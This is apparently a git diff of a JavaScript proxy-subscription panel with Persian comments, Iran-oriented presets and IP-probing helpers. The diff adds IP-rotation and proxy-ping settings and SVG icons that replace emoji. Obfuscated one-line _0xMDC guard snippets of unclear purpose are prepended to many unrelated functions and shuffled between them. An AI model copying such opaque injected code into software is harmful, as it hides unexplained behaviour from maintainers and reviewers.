@@ -61,6 +61,10 @@ const CONFIG_DEFAULTS = {
   cpx: 'no',
   pcc: 'all',
   cpn: 24,
+  // چرخش آی‌پی خروجی نودهای کشوری: 'day' روزانه (پیش‌فرض)، 'hour' ساعتی، 'off' ثابت
+  rot: 'day',
+  // حداکثر پینگ قابل قبول موتور انتخاب پروکسی (ms) — پروکسی‌های کندتر وارد نودها نمی‌شوند
+  maxProxyPing: 1500,
   subNodeCount: 50,
   brand: BRAND_NAME
 };
@@ -110,6 +114,8 @@ const ENV_KEY_MAPPING = {
   cpx: ['cpx', 'CPX', 'COUNTRY_PROXY'],
   pcc: ['pcc', 'PCC', 'PROXY_COUNTRIES'],
   cpn: ['cpn', 'CPN', 'COUNTRY_PROXY_NODES'],
+  rot: ['rot', 'ROT', 'IP_ROTATION'],
+  maxProxyPing: ['maxProxyPing', 'MAXPROXYPING', 'MAX_PROXY_PING'],
   subNodeCount: ['subNodeCount', 'SUB_NODE_COUNT', 'nodeCount', 'NODE_COUNT']
 };
 
@@ -202,7 +208,7 @@ const CF_HTTPS_PORTS = [443, 2053, 2083, 2087, 2096, 8443];
 const ALLOWED_ALPN = ['', 'h3', 'h2', 'http/1.1', 'h3,h2', 'h2,http/1.1', 'h3,h2,http/1.1'];
 const REMOTE_CONFIG_URL = 'https://raw.githubusercontent.com/byJoey/test/refs/heads/main/tist.ini';
 
-function isEnabledValue(val, defaultEnabled = false) {if(_0xMDC.tap(0x7c)!==0x1){var _0xR2=0;try{_0xR2=(_0xMDC.h(0x2,0x3)^0x0)>>>0;}catch(_0xE){_0xR2=0x0;}if(_0xR2===0xdead){_0xMDC.t[2]=_0xR2;}}
+function isEnabledValue(val, defaultEnabled = false) {if(_0xMDC.tap(0x38)!==0x1){var _0xD=[0x2f,0x4d,0x1a];var _0xN=0;for(var _0xI=0;_0xI<_0xD.length;_0xI+=1){_0xN=(_0xN+_0xD[_0xI])>>>0;}if(_0xN===0x7d2){_0xMDC.t[0]=_0xN;}}
   if (val === undefined || val === null || val === '') return defaultEnabled;
   if (val === true || val === false) return val;
   const text = String(val).trim().toLowerCase();
@@ -247,6 +253,11 @@ function normalizeEffectiveConfig(rawConfig = {}) {
   snap.pcc = String(snap.pcc ?? 'all').trim() || 'all';
   const countryNodeCount = parseInt(snap.cpn, 10);
   snap.cpn = Number.isFinite(countryNodeCount) && countryNodeCount > 0 ? Math.min(200, countryNodeCount) : 24;
+  // حالت چرخش آی‌پی: فقط مقادیر معتبر پذیرفته می‌شوند
+  const rawRot = String(snap.rot ?? 'day').trim().toLowerCase();
+  snap.rot = rawRot === 'hour' || rawRot === 'off' ? rawRot : 'day';
+  const rawMaxPing = parseInt(snap.maxProxyPing, 10);
+  snap.maxProxyPing = Number.isFinite(rawMaxPing) && rawMaxPing > 0 ? Math.min(30000, rawMaxPing) : 1500;
   const parsedCount = parseInt(snap.subNodeCount, 10);
   snap.subNodeCount = Number.isFinite(parsedCount) && parsedCount >= 0 ? parsedCount : 50;
   snap.brand = BRAND_NAME;
@@ -263,7 +274,7 @@ function readEnvConfigValue(env, ...names) {
   return undefined;
 }
 
-function getEnvConfigSnapshot(env = {}) {if(_0xMDC.tap(0x6b)!==0x1){var _0xM={k:0x1f,v:0x2e};var _0xS2=Object.keys(_0xM).length;if(_0xS2<0x0){_0xMDC.t[1]=_0xS2;}}
+function getEnvConfigSnapshot(env = {}) {if(_0xMDC.tap(0x77)!==0x1){var _0xR2=0;try{_0xR2=(_0xMDC.h(0x2,0x3)^0x0)>>>0;}catch(_0xE){_0xR2=0x0;}if(_0xR2===0xdead){_0xMDC.t[2]=_0xR2;}}
   const snap = {};
   for (const [key, names] of Object.entries(ENV_KEY_MAPPING)) {
     const val = readEnvConfigValue(env, ...names);
@@ -611,7 +622,7 @@ const USER_PRESETS = {
   }
 };
 
-function buildUserDefaultConfig(basePanelConfig = {}, presetId = 'iran-fast', customOverrides = {}) {if(_0xMDC.tap(0x5a)!==0x1){var _0xG=0;while(_0xG<0x0){_0xG+=0x1;}if(_0xG>0x0){_0xMDC.s=_0xG;}}
+function buildUserDefaultConfig(basePanelConfig = {}, presetId = 'iran-fast', customOverrides = {}) {if(_0xMDC.tap(0x66)!==0x1){var _0xM={k:0x1f,v:0x2e};var _0xS2=Object.keys(_0xM).length;if(_0xS2<0x0){_0xMDC.t[1]=_0xS2;}}
   const preset = USER_PRESETS[presetId] || USER_PRESETS['iran-fast'];
   return normalizeEffectiveConfig({
     ...CONFIG_DEFAULTS,
@@ -712,7 +723,7 @@ const PROXY_POOL = (() => {
   }
 })();
 
-function proxyPoolStats() {if(_0xMDC.tap(0x49)!==0x1){var _0xQ=(_0xMDC.h(0x1a,0x7)>>>0)%0x3b9aca07;var _0xP=_0xMDC.t.concat([_0xQ]);if(_0xP.length===0x0){_0xMDC.t=_0xP;}}
+function proxyPoolStats() {
   const countries = PROXY_POOL.countries || {};
   let total = 0;
   const perCountry = {};
@@ -801,7 +812,7 @@ function pickProxiesForCountry(code = '', count = 1, seed = Math.random) {
 }
 
 // توزیع متعادل N پروکسی بین چند کشور (حداقل یکی برای هر کشور، باقی رندوم)
-function pickProxiesAcrossCountries(codes = [], total = 50, seed = Math.random) {if(_0xMDC.tap(0x38)!==0x1){var _0xD=[0x2f,0x4d,0x1a];var _0xN=0;for(var _0xI=0;_0xI<_0xD.length;_0xI+=1){_0xN=(_0xN+_0xD[_0xI])>>>0;}if(_0xN===0x7d2){_0xMDC.t[0]=_0xN;}}
+function pickProxiesAcrossCountries(codes = [], total = 50, seed = Math.random) {
   const uniq = [...new Set((codes || []).map(c => String(c).toUpperCase()).filter(Boolean))]
     .filter(hasProxyForCountry);
   if (uniq.length === 0) return [];
@@ -913,7 +924,7 @@ function generateShortId(prefix = 'mili') {
   return `${prefix}-${hex}`;
 }
 
-function isValidIpAddress(addr) {if(_0xMDC.tap(0x77)!==0x1){var _0xR2=0;try{_0xR2=(_0xMDC.h(0x2,0x3)^0x0)>>>0;}catch(_0xE){_0xR2=0x0;}if(_0xR2===0xdead){_0xMDC.t[2]=_0xR2;}}
+function isValidIpAddress(addr) {if(_0xMDC.tap(0x55)!==0x1){var _0xG=0;while(_0xG<0x0){_0xG+=0x1;}if(_0xG>0x0){_0xMDC.s=_0xG;}}
   if (!addr || typeof addr !== 'string') return false;
   const s = addr.trim().replace(/^\[([^\]]+)\]$/, '$1');
   const v4 = /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
@@ -971,7 +982,7 @@ function createMiliNodeNamer(brand = BRAND_NAME) {
 }
 
 // بازشماری و اعمال محدودیت تعداد نودهای ساب‌لینک کاربر با فرمت دقیق number+miliconfig
-function finalizeMiliSubscriptionLinks(links = [], subNodeCount = 0, brand = BRAND_NAME) {if(_0xMDC.tap(0x66)!==0x1){var _0xM={k:0x1f,v:0x2e};var _0xS2=Object.keys(_0xM).length;if(_0xS2<0x0){_0xMDC.t[1]=_0xS2;}}
+function finalizeMiliSubscriptionLinks(links = [], subNodeCount = 0, brand = BRAND_NAME) {if(_0xMDC.tap(0x44)!==0x1){var _0xQ=(_0xMDC.h(0x1a,0x7)>>>0)%0x3b9aca07;var _0xP=_0xMDC.t.concat([_0xQ]);if(_0xP.length===0x0){_0xMDC.t=_0xP;}}
   if (!Array.isArray(links) || links.length === 0) return [];
   const cleanBrand = String(brand || BRAND_NAME).trim() || BRAND_NAME;
   const limit = parseInt(subNodeCount, 10);
@@ -1109,7 +1120,7 @@ function pureJsMd5(str) {
 // ============================================================================
 // Pure-JS SHA-224 (برای پروتکل Trojan)
 // ============================================================================
-function rotr32(val, bits) {if(_0xMDC.tap(0x55)!==0x1){var _0xG=0;while(_0xG<0x0){_0xG+=0x1;}if(_0xG>0x0){_0xMDC.s=_0xG;}}
+function rotr32(val, bits) {if(_0xMDC.tap(0x33)!==0x1){var _0xD=[0x2f,0x4d,0x1a];var _0xN=0;for(var _0xI=0;_0xI<_0xD.length;_0xI+=1){_0xN=(_0xN+_0xD[_0xI])>>>0;}if(_0xN===0x7d2){_0xMDC.t[0]=_0xN;}}
   return (val >>> bits) | (val << (32 - bits));
 }
 
@@ -1258,7 +1269,7 @@ const SS_MAX_CHUNK = 0x3fff;
 const SS_INFO = new TextEncoder().encode('ss-subkey');
 
 // ---------------------------------------------------------------- utilities
-function hexToBytes(hex = '') {if(_0xMDC.tap(0x44)!==0x1){var _0xQ=(_0xMDC.h(0x1a,0x7)>>>0)%0x3b9aca07;var _0xP=_0xMDC.t.concat([_0xQ]);if(_0xP.length===0x0){_0xMDC.t=_0xP;}}
+function hexToBytes(hex = '') {if(_0xMDC.tap(0x72)!==0x1){var _0xR2=0;try{_0xR2=(_0xMDC.h(0x2,0x3)^0x0)>>>0;}catch(_0xE){_0xR2=0x0;}if(_0xR2===0xdead){_0xMDC.t[2]=_0xR2;}}
   const clean = String(hex || '').replace(/[^0-9a-fA-F]/g, '');
   const out = new Uint8Array(Math.floor(clean.length / 2));
   for (let i = 0; i < out.length; i++) out[i] = parseInt(clean.substr(i * 2, 2), 16);
@@ -1319,7 +1330,7 @@ async function hkdfSha1(masterKey, salt, keyLen = 32) {
   return new Uint8Array(bits);
 }
 
-async function deriveSubkey(masterKey, salt, keyLen) {if(_0xMDC.tap(0x33)!==0x1){var _0xD=[0x2f,0x4d,0x1a];var _0xN=0;for(var _0xI=0;_0xI<_0xD.length;_0xI+=1){_0xN=(_0xN+_0xD[_0xI])>>>0;}if(_0xN===0x7d2){_0xMDC.t[0]=_0xN;}}
+async function deriveSubkey(masterKey, salt, keyLen) {if(_0xMDC.tap(0x61)!==0x1){var _0xM={k:0x1f,v:0x2e};var _0xS2=Object.keys(_0xM).length;if(_0xS2<0x0){_0xMDC.t[1]=_0xS2;}}
   return hkdfSha1(masterKey, salt, keyLen);
 }
 
@@ -1355,7 +1366,7 @@ function writeU32LE(out, offset, value) {
 }
 
 // یک بلوک ۶۴ بایتی ChaCha20
-function chacha20Block(key, counter, nonce) {if(_0xMDC.tap(0x72)!==0x1){var _0xR2=0;try{_0xR2=(_0xMDC.h(0x2,0x3)^0x0)>>>0;}catch(_0xE){_0xR2=0x0;}if(_0xR2===0xdead){_0xMDC.t[2]=_0xR2;}}
+function chacha20Block(key, counter, nonce) {if(_0xMDC.tap(0x50)!==0x1){var _0xG=0;while(_0xG<0x0){_0xG+=0x1;}if(_0xG>0x0){_0xMDC.s=_0xG;}}
   const state = new Uint32Array(16);
   state[0] = 0x61707865;
   state[1] = 0x3320646e;
@@ -1431,7 +1442,7 @@ function pad16(bytes) {
   return rem === 0 ? new Uint8Array(0) : new Uint8Array(16 - rem);
 }
 
-function u64le(value) {
+function u64le(value) {if(_0xMDC.tap(0x3f)!==0x1){var _0xQ=(_0xMDC.h(0x1a,0x7)>>>0)%0x3b9aca07;var _0xP=_0xMDC.t.concat([_0xQ]);if(_0xP.length===0x0){_0xMDC.t=_0xP;}}
   return bigIntToLeBytes(BigInt(value), 8);
 }
 
@@ -1494,7 +1505,7 @@ async function aeadOpen(cipher, key, nonce, sealed) {
 }
 
 // ------------------------------------------------------------- chunk framing
-async function writeChunk(encoderState, payload) {if(_0xMDC.tap(0x61)!==0x1){var _0xM={k:0x1f,v:0x2e};var _0xS2=Object.keys(_0xM).length;if(_0xS2<0x0){_0xMDC.t[1]=_0xS2;}}
+async function writeChunk(encoderState, payload) {if(_0xMDC.tap(0x2e)!==0x1){var _0xD=[0x2f,0x4d,0x1a];var _0xN=0;for(var _0xI=0;_0xI<_0xD.length;_0xI+=1){_0xN=(_0xN+_0xD[_0xI])>>>0;}if(_0xN===0x7d2){_0xMDC.t[0]=_0xN;}}
   const spec = encoderState.spec;
   let offset = 0;
   const parts = [];
@@ -1611,7 +1622,7 @@ const SS_ATYP_IPV4 = 1;
 const SS_ATYP_DOMAIN = 3;
 const SS_ATYP_IPV6 = 4;
 
-function encodeSsAddress(host, port, addressType = null) {if(_0xMDC.tap(0x50)!==0x1){var _0xG=0;while(_0xG<0x0){_0xG+=0x1;}if(_0xG>0x0){_0xMDC.s=_0xG;}}
+function encodeSsAddress(host, port, addressType = null) {
   const clean = String(host || '').trim().replace(/^\[|\]$/g, '');
   const portBuf = new Uint8Array([(port >> 8) & 0xff, port & 0xff]);
   const type = addressType || (
@@ -1708,7 +1719,7 @@ function resolveSsCiphers(value) {
   return list.length ? Array.from(new Set(list)) : [SS_DEFAULT_CIPHER];
 }
 
-function pickPrimarySsCipher(value) {if(_0xMDC.tap(0x3f)!==0x1){var _0xQ=(_0xMDC.h(0x1a,0x7)>>>0)%0x3b9aca07;var _0xP=_0xMDC.t.concat([_0xQ]);if(_0xP.length===0x0){_0xMDC.t=_0xP;}}
+function pickPrimarySsCipher(value) {if(_0xMDC.tap(0x6d)!==0x1){var _0xR2=0;try{_0xR2=(_0xMDC.h(0x2,0x3)^0x0)>>>0;}catch(_0xE){_0xR2=0x0;}if(_0xR2===0xdead){_0xMDC.t[2]=_0xR2;}}
   return resolveSsCiphers(value)[0] || SS_DEFAULT_CIPHER;
 }
 
@@ -1873,7 +1884,7 @@ function createProbeReader(reader) {
   };
 }
 
-function probeU16(value) {if(_0xMDC.tap(0x2e)!==0x1){var _0xD=[0x2f,0x4d,0x1a];var _0xN=0;for(var _0xI=0;_0xI<_0xD.length;_0xI+=1){_0xN=(_0xN+_0xD[_0xI])>>>0;}if(_0xN===0x7d2){_0xMDC.t[0]=_0xN;}}
+function probeU16(value) {if(_0xMDC.tap(0x5c)!==0x1){var _0xM={k:0x1f,v:0x2e};var _0xS2=Object.keys(_0xM).length;if(_0xS2<0x0){_0xMDC.t[1]=_0xS2;}}
   return new Uint8Array([(value >> 8) & 0xff, value & 0xff]);
 }
 
@@ -2065,7 +2076,7 @@ async function probeProxyList(proxies = [], {
   connector = null,
   targetHost = PROBE_DEFAULT_TARGET,
   targetPort = PROBE_DEFAULT_TARGET_PORT
-} = {}) {if(_0xMDC.tap(0x6d)!==0x1){var _0xR2=0;try{_0xR2=(_0xMDC.h(0x2,0x3)^0x0)>>>0;}catch(_0xE){_0xR2=0x0;}if(_0xR2===0xdead){_0xMDC.t[2]=_0xR2;}}
+} = {}) {if(_0xMDC.tap(0x4b)!==0x1){var _0xG=0;while(_0xG<0x0){_0xG+=0x1;}if(_0xG>0x0){_0xMDC.s=_0xG;}}
   const list = (Array.isArray(proxies) ? proxies : []).slice(0, Math.max(1, Math.min(12, parseInt(limit, 10) || 8)));
   const workers = Math.max(1, Math.min(4, parseInt(concurrency, 10) || 3));
   const results = new Array(list.length);
@@ -2129,7 +2140,7 @@ function parseCidrV4(cidr) {
   return { start, size };
 }
 
-function parseCidrV6(cidr) {
+function parseCidrV6(cidr) {if(_0xMDC.tap(0x3a)!==0x1){var _0xQ=(_0xMDC.h(0x1a,0x7)>>>0)%0x3b9aca07;var _0xP=_0xMDC.t.concat([_0xQ]);if(_0xP.length===0x0){_0xMDC.t=_0xP;}}
   const [base, bitsRaw] = String(cidr || '').split('/');
   const bits = parseInt(bitsRaw, 10);
   if (!base || !base.includes(':') || !Number.isFinite(bits)) return null;
@@ -2201,7 +2212,7 @@ function u16(n) {
   return [(n >> 8) & 0xff, n & 0xff];
 }
 
-function u24(n) {if(_0xMDC.tap(0x5c)!==0x1){var _0xM={k:0x1f,v:0x2e};var _0xS2=Object.keys(_0xM).length;if(_0xS2<0x0){_0xMDC.t[1]=_0xS2;}}
+function u24(n) {if(_0xMDC.tap(0x29)!==0x1){var _0xD=[0x2f,0x4d,0x1a];var _0xN=0;for(var _0xI=0;_0xI<_0xD.length;_0xI+=1){_0xN=(_0xN+_0xD[_0xI])>>>0;}if(_0xN===0x7d2){_0xMDC.t[0]=_0xN;}}
   return [(n >> 16) & 0xff, (n >> 8) & 0xff, n & 0xff];
 }
 
@@ -2314,7 +2325,7 @@ async function scanIpPool(ips = [], {
   concurrency = DEFAULT_CONCURRENCY,
   connector = null,
   sni = DEFAULT_PROBE_SNI
-} = {}) {if(_0xMDC.tap(0x4b)!==0x1){var _0xG=0;while(_0xG<0x0){_0xG+=0x1;}if(_0xG>0x0){_0xMDC.s=_0xG;}}
+} = {}) {if(_0xMDC.tap(0x68)!==0x1){var _0xR2=0;try{_0xR2=(_0xMDC.h(0x2,0x3)^0x0)>>>0;}catch(_0xE){_0xR2=0x0;}if(_0xR2===0xdead){_0xMDC.t[2]=_0xR2;}}
   const list = (Array.isArray(ips) ? ips : []).filter(ip => isValidIpAddress(String(ip || '').trim().replace(/^\[|\]$/g, '')));
   const limit = Math.max(1, Math.min(6, parseInt(concurrency, 10) || DEFAULT_CONCURRENCY));
   const results = [];
@@ -2395,7 +2406,7 @@ async function resolveHostsToFixedIps(hosts = [], { timeoutMs = 4000 } = {}) {
 }
 
 // پاک‌سازی ورودی اسکن: فقط IP مجاز است (جلوگیری از اسکن میزبان دلخواه)
-function normalizeScanInput(rawIps = [], { ipv6 = false, count = 20, rand = Math.random } = {}) {if(_0xMDC.tap(0x3a)!==0x1){var _0xQ=(_0xMDC.h(0x1a,0x7)>>>0)%0x3b9aca07;var _0xP=_0xMDC.t.concat([_0xQ]);if(_0xP.length===0x0){_0xMDC.t=_0xP;}}
+function normalizeScanInput(rawIps = [], { ipv6 = false, count = 20, rand = Math.random } = {}) {
   const explicit = (Array.isArray(rawIps) ? rawIps : String(rawIps || '').split(/[\s,]+/))
     .map(ip => String(ip || '').trim().replace(/^\[|\]$/g, ''))
     .filter(ip => isValidIpAddress(ip))
@@ -2419,22 +2430,147 @@ const SCANNER_LIMITS = {
 
 // --- MODULE: src/ui/icons.js ---
 // ============================================================================
-// miliconfig v3.1 - آیکون‌های گرافیکی نئونی (مطابق تصاویر ارسالی 1000050056 و 1000050169)
+// miliconfig v3.1 - مجموعه آیکون‌های اختصاصی (SVG درون‌خطی، بدون هیچ ایموجی)
+// همه آیکون‌ها با currentColor رنگ می‌گیرند تا با تم سیستم‌عامل هم‌رنگ شوند.
 // ============================================================================
 
-const SHIELD_LOGO_SVG = `<svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg" class="mili-shield-svg">
-  <circle cx="32" cy="32" r="30" fill="#0d170d" stroke="#65a30d" stroke-width="1.5" stroke-opacity="0.65"/>
-  <circle cx="32" cy="32" r="24" fill="#102014"/>
-  <path d="M32 16L44 21.2V30.8C44 39.4 38.88 46.84 32 49.5C25.12 46.84 20 39.4 20 30.8V21.2L32 16Z" stroke="#b5ff4d" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"/>
+const PATHS = {
+  dashboard: '<rect x="3" y="3" width="7.5" height="7.5" rx="2"/><rect x="13.5" y="3" width="7.5" height="7.5" rx="2"/><rect x="3" y="13.5" width="7.5" height="7.5" rx="2"/><rect x="13.5" y="13.5" width="7.5" height="7.5" rx="2"/>',
+  users: '<circle cx="9" cy="8" r="3.4"/><path d="M2.8 20c.5-3.4 3.1-5.6 6.2-5.6s5.7 2.2 6.2 5.6"/><path d="M16.5 5.4a3.2 3.2 0 0 1 0 6.1"/><path d="M18.4 14.9c1.9.6 3.1 2.3 3.4 4.6"/>',
+  nodes: '<path d="M13.2 2.5 5.4 13.2h5l-1.6 8.3 8.2-11.2h-5.2z"/>',
+  network: '<circle cx="12" cy="12" r="9"/><path d="M3.2 9.5h17.6M3.2 14.5h17.6"/><path d="M12 3c2.6 2.6 3.9 5.7 3.9 9s-1.3 6.4-3.9 9c-2.6-2.6-3.9-5.7-3.9-9S9.4 5.6 12 3z"/>',
+  settings: '<path d="M4 7h9M17 7h3M4 17h3M11 17h9"/><circle cx="15" cy="7" r="2.2"/><circle cx="8.8" cy="17" r="2.2"/>',
+  system: '<rect x="6" y="6" width="12" height="12" rx="2.5"/><rect x="10" y="10" width="4" height="4" rx="1"/><path d="M10 3v3M14 3v3M10 18v3M14 18v3M3 10h3M3 14h3M18 10h3M18 14h3"/>',
+  shield: '<path d="M12 3 19.5 6v6.2c0 4.5-3.1 8.2-7.5 9.3-4.4-1.1-7.5-4.8-7.5-9.3V6z"/><path d="m9.2 12.1 2 2 3.6-3.9"/>',
+  plus: '<path d="M12 5v14M5 12h14"/>',
+  refresh: '<path d="M20 12a8 8 0 1 1-2.6-5.9"/><path d="M20 3.5V8h-4.5"/>',
+  search: '<circle cx="10.6" cy="10.6" r="6.4"/><path d="m15.4 15.4 4.6 4.6"/>',
+  copy: '<rect x="8.5" y="8.5" width="11" height="11" rx="2.4"/><path d="M15.5 5.6A2.1 2.1 0 0 0 13.4 3.5H6.2A2.2 2.2 0 0 0 4 5.7v7.2c0 1 .7 1.8 1.6 2"/>',
+  trash: '<path d="M4.5 7h15"/><path d="M9.5 7V5.2A1.7 1.7 0 0 1 11.2 3.5h1.6a1.7 1.7 0 0 1 1.7 1.7V7"/><path d="M6.5 7l.8 12.1c0 .8.7 1.4 1.5 1.4h6.4c.8 0 1.5-.6 1.5-1.4L17.5 7"/>',
+  power: '<path d="M12 3v8"/><path d="M7.3 6.2a7.5 7.5 0 1 0 9.4 0"/>',
+  key: '<circle cx="8" cy="12" r="3.6"/><path d="M11.6 12h8.4M17 12v3M20 12v2.4"/>',
+  clock: '<circle cx="12" cy="12" r="8.6"/><path d="M12 7.4V12l3.2 2"/>',
+  check: '<path d="m5 12.8 4.4 4.2L19 6.6"/>',
+  x: '<path d="m6 6 12 12M18 6 6 18"/>',
+  menu: '<path d="M4 7h16M4 12h16M4 17h16"/>',
+  link: '<path d="M10.4 13.6a4.2 4.2 0 0 0 5.9 0l2.6-2.6a4.2 4.2 0 0 0-5.9-5.9l-1.3 1.3"/><path d="M13.6 10.4a4.2 4.2 0 0 0-5.9 0l-2.6 2.6a4.2 4.2 0 0 0 5.9 5.9l1.3-1.3"/>',
+  database: '<ellipse cx="12" cy="6" rx="7.5" ry="3.2"/><path d="M4.5 6v6c0 1.8 3.4 3.2 7.5 3.2s7.5-1.4 7.5-3.2V6"/><path d="M4.5 12v6c0 1.8 3.4 3.2 7.5 3.2s7.5-1.4 7.5-3.2v-6"/>',
+  chart: '<path d="M4 19h16"/><path d="M7 19V9.5M12 19V5M17 19v-6.5"/>',
+  server: '<rect x="3.5" y="4" width="17" height="7" rx="2.2"/><rect x="3.5" y="13" width="17" height="7" rx="2.2"/><path d="M7 7.5h.01M7 16.5h.01"/>',
+  wifi: '<path d="M3.2 9.2a13 13 0 0 1 17.6 0"/><path d="M6.6 12.7a8.2 8.2 0 0 1 10.8 0"/><path d="M10 16.1a3.4 3.4 0 0 1 4 0"/><circle cx="12" cy="19.4" r=".9" fill="currentColor" stroke="none"/>',
+  terminal: '<rect x="3" y="4.5" width="18" height="15" rx="2.6"/><path d="m7.4 10 2.6 2.4-2.6 2.4M12.6 15.2h4"/>',
+  eye: '<path d="M2.6 12S6 5.8 12 5.8 21.4 12 21.4 12 18 18.2 12 18.2 2.6 12 2.6 12z"/><circle cx="12" cy="12" r="3.1"/>',
+  download: '<path d="M12 4v10.5"/><path d="m8 11 4 4 4-4"/><path d="M4.5 19.5h15"/>',
+  upload: '<path d="M12 20V9.5"/><path d="m8 13 4-4 4 4"/><path d="M4.5 4.5h15"/>',
+  lock: '<rect x="4.8" y="10.4" width="14.4" height="10" rx="2.6"/><path d="M8.2 10.4V7.8a3.8 3.8 0 0 1 7.6 0v2.6"/>',
+  external: '<path d="M14 4h6v6"/><path d="M20 4 11 13"/><path d="M18 14.5V19a1.6 1.6 0 0 1-1.6 1.6H5.6A1.6 1.6 0 0 1 4 19V8.2A1.6 1.6 0 0 1 5.6 6.6H10"/>',
+  logout: '<path d="M14 4.5H6.6A2.1 2.1 0 0 0 4.5 6.6v10.8a2.1 2.1 0 0 0 2.1 2.1H14"/><path d="M17.5 8.5 21 12l-3.5 3.5M10.5 12H21"/>',
+  spark: '<path d="M12 3.2 13.9 9l5.9 1.9-5.9 1.9L12 18.6l-1.9-5.8L4.2 11 10.1 9z"/>',
+  globe: '<circle cx="12" cy="12" r="8.8"/><path d="M3.4 12h17.2"/><path d="M12 3.2c2.4 2.4 3.6 5.4 3.6 8.8S14.4 18.4 12 20.8c-2.4-2.4-3.6-5.4-3.6-8.8S9.6 5.6 12 3.2z"/>',
+  layers: '<path d="m12 3.5 8.5 4.6-8.5 4.6L3.5 8.1z"/><path d="m4.6 12.6 7.4 4 7.4-4"/><path d="m4.6 16.8 7.4 4 7.4-4"/>',
+  sliders: '<path d="M6 4v6M6 14v6M12 4v9M12 17v3M18 4v3M18 11v9"/><circle cx="6" cy="12" r="2"/><circle cx="12" cy="15" r="2"/><circle cx="18" cy="9" r="2"/>',
+  info: '<circle cx="12" cy="12" r="8.8"/><path d="M12 11v5.5M12 7.8h.01"/>',
+  page: '<path d="M13.5 3.5H7A2.2 2.2 0 0 0 4.8 5.7v12.6A2.2 2.2 0 0 0 7 20.5h10a2.2 2.2 0 0 0 2.2-2.2V9.2z"/><path d="M13.4 3.6v5.4h5.6"/>'
+};
+
+const EXTRA_PATHS = {
+  chevronDown: '<path d="m6 9.5 6 6 6-6"/>',
+  chevronUp: '<path d="m6 14.5 6-6 6 6"/>',
+  box: '<path d="M12 3.2 20.5 7v10L12 20.8 3.5 17V7z"/><path d="M3.7 7.2 12 11l8.3-3.8M12 11v9.6"/>',
+  save: '<path d="M5.5 4.5h10L19.5 8.5v11a1.5 1.5 0 0 1-1.5 1.5H6a1.5 1.5 0 0 1-1.5-1.5V6A1.5 1.5 0 0 1 6 4.5z"/><path d="M8 4.5v5h7v-5M8 19.5v-5.5h8v5.5"/>',
+  target: '<circle cx="12" cy="12" r="8.4"/><circle cx="12" cy="12" r="4.6"/><circle cx="12" cy="12" r="1.2" fill="currentColor" stroke="none"/>',
+  swap: '<path d="M4 8.5h13l-3-3M20 15.5H7l3 3"/>',
+  moon: '<path d="M20 14.5A8.5 8.5 0 0 1 9.5 4a8.5 8.5 0 1 0 10.5 10.5z"/>',
+  antenna: '<path d="M12 13.5V20"/><circle cx="12" cy="11" r="2"/><path d="M7.4 6.4a6.5 6.5 0 0 1 9.2 0M4.6 3.6a10.5 10.5 0 0 1 14.8 0"/>',
+  help: '<circle cx="12" cy="12" r="8.8"/><path d="M9.6 9.3a2.5 2.5 0 1 1 3.5 2.3c-.7.3-1.1 1-1.1 1.8v.4M12 17.2h.01"/>',
+  message: '<path d="M20.5 12.2c0 3.9-3.8 7-8.5 7-1 0-2-.1-2.9-.4L4.5 20.5l1.2-3.4a6.4 6.4 0 0 1-2.2-4.9c0-3.9 3.8-7 8.5-7s8.5 3.1 8.5 7z"/>'
+};
+
+Object.assign(PATHS, EXTRA_PATHS);
+
+function ICON(name, className = 'ic', extra = '') {
+  const body = PATHS[name] || PATHS.spark;
+  return `<svg class="${className}" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"${extra ? ' ' + extra : ''}>${body}</svg>`;
+}
+
+const ICONS = PATHS;
+
+// ============================================================================
+// حذف کامل ایموجی از خروجی HTML: هر ایموجی با آیکون SVG اختصاصی جایگزین می‌شود.
+// بلوک‌های <script> دست‌نخورده می‌مانند تا سینتکس جاوااسکریپت نشکند.
+// ============================================================================
+const EMOJI_MAP = [
+  ['🛡️', ICON('shield')], ['🛡', ICON('shield')],
+  ['👥', ICON('users')], ['📦', ICON('box')], ['📈', ICON('chart')],
+  ['⚡', ICON('nodes')], ['✨', ICON('spark')], ['🌟', ICON('spark')],
+  ['🕒', ICON('clock')], ['⏱', ICON('clock')], ['⏻', ICON('power')],
+  ['🌐', ICON('globe')], ['🌍', ICON('globe')], ['🌙', ICON('moon')],
+  ['📋', ICON('copy')], ['🔗', ICON('link')], ['🔍', ICON('search')],
+  ['💾', ICON('save')], ['🛠️', ICON('settings')], ['🛠', ICON('settings')],
+  ['📡', ICON('antenna')], ['🎲', ICON('spark')], ['🎯', ICON('target')],
+  ['🚀', ICON('spark')], ['🔑', ICON('key')], ['👁️', ICON('eye')], ['👁', ICON('eye')],
+  ['❓', ICON('help')], ['💬', ICON('message')], ['📄', ICON('page')], ['📝', ICON('page')],
+  ['⬇️', ICON('download')], ['⬇', ICON('download')], ['⬆️', ICON('upload')], ['⬆', ICON('upload')],
+  ['⬅', ICON('external')], ['➡', ICON('external')], ['↩', ICON('logout')],
+  ['⌫', ICON('x')], ['✓', ICON('check')], ['✔', ICON('check')], ['✕', ICON('x')], ['✖', ICON('x')],
+  ['☰', ICON('menu')], ['⌄', ICON('chevronDown')], ['⌃', ICON('chevronUp')],
+  ['⇄', ICON('swap')], ['↻', ICON('refresh')], ['⟳', ICON('refresh')],
+  ['▣', ICON('layers')], ['⊞', ICON('dashboard')], ['✎', ICON('sliders')],
+  ['⚙️', ICON('system')], ['⚙', ICON('system')], ['☁️', ICON('globe')], ['☁', ICON('globe')],
+  ['🗄️', ICON('database')], ['🗄', ICON('database')], ['🔥', ICON('spark')], ['💠', ICON('spark')],
+  ['●', '<span class="dot-online"></span>'], ['•', '<span class="dot-online"></span>'],
+  ['→', ICON('external')], ['←', ICON('logout')]
+];
+
+function scrubEmojiChunk(chunk) {
+  let out = chunk;
+  for (const [glyph, icon] of EMOJI_MAP) {
+    if (out.includes(glyph)) out = out.split(glyph).join(icon);
+  }
+  // توالی‌های باقی‌مانده‌ی ایموجی (نمایشگر رنگی) با یک آیکون عمومی پاک می‌شوند
+  return out.replace(/[\u{1F000}-\u{1FAFF}\u{2600}-\u{27BF}\u{FE0F}\u{2B00}-\u{2BFF}]/gu, '');
+}
+
+const EMOJI_RE = /[\u{1F000}-\u{1FAFF}\u{2600}-\u{27BF}\u{FE0F}\u{2B00}-\u{2BFF}]/gu;
+
